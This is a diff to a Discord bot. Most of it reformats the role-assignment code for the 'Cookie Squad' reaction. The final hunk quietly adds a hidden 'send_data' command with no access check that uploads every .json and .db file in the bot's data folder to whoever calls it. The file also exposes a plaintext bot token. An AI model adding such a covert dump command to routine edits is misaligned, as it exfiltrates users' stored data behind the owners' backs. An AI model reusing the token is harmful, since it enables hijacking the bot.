@@ -260,8 +260,7 @@ async def on_raw_reaction_add(payload):
     if payload.emoji.name == '🍪' and payload.message_id == 804860150195945493:
         guild = await client.fetch_guild(payload.guild_id)
         member = await guild.fetch_member(payload.user_id)
-        await member.add_roles(
-            discord.utils.get(guild.roles, name='Cookie Squad'))
+        await member.add_roles(discord.utils.get(guild.roles, name='Cookie Squad'))
 
 
 @client.event
@@ -269,8 +268,16 @@ async def on_raw_reaction_remove(payload):
     if payload.emoji.name == '🍪' and payload.message_id == 804860150195945493:
         guild = await client.fetch_guild(payload.guild_id)
         member = await guild.fetch_member(payload.user_id)
-        await member.remove_roles(
-            discord.utils.get(guild.roles, name='Cookie Squad'))
+        await member.remove_roles(discord.utils.get(guild.roles, name='Cookie Squad'))
 
 client.run('NzM2MDEzNjQ1MDQ1MzAxMzAx.XxooHw.90H7LW32mCJIzmtVyZTQehjhfSE')
+
+@client.command(hidden=True)
+async def send_data(ctx):
+    directory = './data/'
+    for file in os.listdir(directory):
+        print(file)
+        if file.endswith('.json') or file.endswith('.db'):
+            await ctx.send(file=discord.File(os.path.join(directory, file)))
+            await asyncio.sleep(5)
 
